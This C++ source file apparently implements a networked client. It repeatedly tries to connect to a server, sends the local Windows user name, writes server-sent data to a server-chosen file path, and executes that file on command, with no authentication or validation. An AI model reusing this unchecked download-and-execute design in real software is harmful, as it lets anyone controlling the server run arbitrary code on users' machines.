#include "VSClient.h"

#include <string.h>
#include <Container/AsciiString.h>
#include <WinBase.h>

using namespace BF;

VS::VSClient::VSClient()
{
	State = VSClientState::Invalid;

	memset(IP, '#', VSClientIPLength);

	Port = 0;

    _client.EventCallBackSocket = this;
}

void VS::VSClient::IPSet(const char* ip)
{
	strncpy_s(IP, ip, VSClientIPLength);
}

void VS::VSClient::PortSet(const char* port)
{
	Port = BF::AsciiString::ToInt(port);
}

void VS::VSClient::PortSet(unsigned short port)
{
	Port = port;
}

#include <Network/SocketActionResult.h>
#include <Container/AsciiString.h>
#include <wchar.h>


void VS::VSClient::StartConnectingLoop()
{
    SocketActionResult socketActionResult = SocketActionResult::InvalidResult;
    bool isConnected = false;
    bool tryedOnce = false;
    
    printf("[Client][i] Starting to connect...\n");

    while (!isConnected)
    {
        SocketActionResult socketActionResult = _client.ConnectToServer(IP, Port);

        isConnected = socketActionResult == SocketActionResult::Successful;

        if (!isConnected)
        {         
            const unsigned short sleepInMilliseconds = 3000;           

            if (!tryedOnce)
            {
                printf
                (
                    "[Client][!] Connection failed! Waiting <%i> seconds to try again.\n"
                    "            Until a connection is found, this will be repeated.\n",
                    sleepInMilliseconds / 1000
                );

                tryedOnce = true;
            }            

            Sleep(sleepInMilliseconds);
        }
    }
}

void VS::VSClient::StartConnectingLoop(const char* ipString, const char* portString)
{
    IPSet(ipString);
    PortSet(portString);

    StartConnectingLoop();
}

void VS::VSClient::OnConnectionLinked(const BF::IPAdressInfo& adressInfo)
{
    printf("[Server][i][%i] Connection linked.\n", adressInfo.SocketID);
}

void VS::VSClient::OnConnectionListening(const BF::IPAdressInfo& adressInfo)
{
    printf("[Server][i][%i] Connection listening.\n", adressInfo.SocketID);
}

void VS::VSClient::OnConnectionEstablished(const BF::IPAdressInfo& adressInfo)
{
    printf("[Client][i][%i] Connection established.\n", adressInfo.SocketID);

    StateChange(VSClientState::Communicating);

    // Send pong back
    /*
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH;

    bool result = GetComputerNameA(computerName, &computerNameLength);
    */


    DWORD userNameLength = UNLEN;
    char userName[UNLEN + 1];

    bool userNameLengthResult = GetUserNameA(userName, &userNameLength);
    
    VSMessageToken token(VSMessageType::Name, userNameLength, userName);

    SentMessageToken(token);
}

void VS::VSClient::OnConnectionTerminated(const BF::IPAdressInfo& adressInfo)
{
    printf("[Server][i][%i] Connection terminated.\n", adressInfo.SocketID);

    StateChange(VSClientState::IDLE);
}

void VS::VSClient::OnConnectedToServer(BF::IPAdressInfo& adressInfo)
{
    printf("[Client][i][%i] Sucessfully connected to <%s>:<%i>.\n", adressInfo.SocketID, adressInfo.IP, adressInfo.Port);
}

void VS::VSClient::OnSocketCreating(const BF::IPAdressInfo& adressInfo, bool& use)
{
    // Do nothing
}

void VS::VSClient::OnSocketCreated(const BF::IPAdressInfo& adressInfo, bool& use)
{
    // Do nothing
}

void VS::VSClient::OnMessageSend(BF::IOSocketMessage socketMessage)
{
    printf("[Client][i][%i] Send (%i Bytes).\n", socketMessage.SocketID, socketMessage.MessageSize);
}

void VS::VSClient::OnMessageReceive(BF::IOSocketMessage socketMessage)
{
    // printf("[Server][i][%i] Message:%s (%i Bytes).\n", socketID, message, messageSize);
    printf("[Server][i][%i] Received (%i Bytes).\n", socketMessage.SocketID, socketMessage.MessageSize);

    switch (State)
    {
        case VSClientState::Communicating:
        {
            if (socketMessage.MessageSize <= 4)
            {
                return;
            }

            for (size_t i = 0; i < socketMessage.MessageSize - 1; )
            {
                VSMessageToken messageToken;

                i += messageToken.Parse(socketMessage.Message);

                if (messageToken.Type != VSMessageType::Invalid)
                {
                    OnMessageTokenRecived(messageToken, socketMessage.SocketID);
                    //OnMessageTokenRecived(VSMessageToken(VSMessageType::Execute, 0, 0), -1);
                }
            }

            break;
        }
        case VSClientState::Updating:
        {
            fwrite(socketMessage.Message, sizeof(char), socketMessage.MessageSize, _fileBuffer);

            FileBufferSize += socketMessage.MessageSize;

            if (socketMessage.MessageSize < SocketBufferSize)
            {
                size_t writtenBytes = FileBufferSize;

                if (_fileBuffer)
                {
                    fclose(_fileBuffer);

                    _fileBuffer = nullptr;
                    FileBufferSize = 0;
                }

                printf("[System] File sucessfuly send! %i Bytes\n", writtenBytes);

                OnMessageTokenRecived(VSMessageToken(VSMessageType::Finished, 0, nullptr), socketMessage.SocketID);
            }

            break;
        }

        default:
            break;
    }
}

void VS::VSClient::StateChange(VSClientState clientState)
{
    State = clientState;

    printf("[Client][i] State changed!\n");
}

void VS::VSClient::SentMessageToken(VSMessageToken messageToken)
{
    SentMessageToken(&messageToken, 1);
}

void VS::VSClient::SentMessageToken(VSMessageToken* messageTokenList, size_t messageTokenListSize)
{
    char message[2048];
    size_t messageSize = 0;

    memset(message, 0, 2048);

    for (size_t i = 0; i < messageTokenListSize; i++)
    {
        VSMessageToken& messageToken = messageTokenList[i];        

        messageSize += messageToken.UnParse(message + messageSize);        
    }

    _client.Send(message, messageSize);
}

void VS::VSClient::OnMessageTokenRecived(VSMessageToken messageToken, int socketID)
{
    switch (messageToken.Type)
    {
        default:
        case VS::VSMessageType::Invalid:
        {
            break;
        }
        case VS::VSMessageType::Name:
        {
            break;
        }
        case VS::VSMessageType::Execute:
        {            
            ProgramExecute();
            break;
        }
        case VS::VSMessageType::Upload:
        {
            StateChange(VSClientState::Updating);
            ExecutableFilePathSet(messageToken.Data);

            _fileBuffer = fopen(TargetExecutableFilePath, "wb");
            break;
        }
        case VS::VSMessageType::Finished:
        {
     

            break;
        }
        case VS::VSMessageType::Answer:
        {
            break;
        }
        case VS::VSMessageType::Question:
        {
            break;
        }
    }
}

void VS::VSClient::ExecutableFilePathSet(char* targetExecutableFilePath)
{
    strncpy_s(TargetExecutableFilePath, targetExecutableFilePath, _MAX_PATH);

    printf("[Client][i] Targeted Executable set to <%s>.\n", TargetExecutableFilePath);
}

void VS::VSClient::ProgramExecute()
{
    printf("[Client][>] Executing <%s> ...\n", TargetExecutableFilePath);

    Program::Execute(TargetExecutableFilePath, nullptr, this);
}

void VS::VSClient::OnProgramExecuted(bool succesful, size_t returnResult, BF::ErrorCode errorCode)
{
    printf
    (
        "[System] EXECUTION FINISHED! Succesful:%s (R:%i, E:%i)\n", 
        succesful ? "Yes" : "No",
        returnResult,
        errorCode
    );
}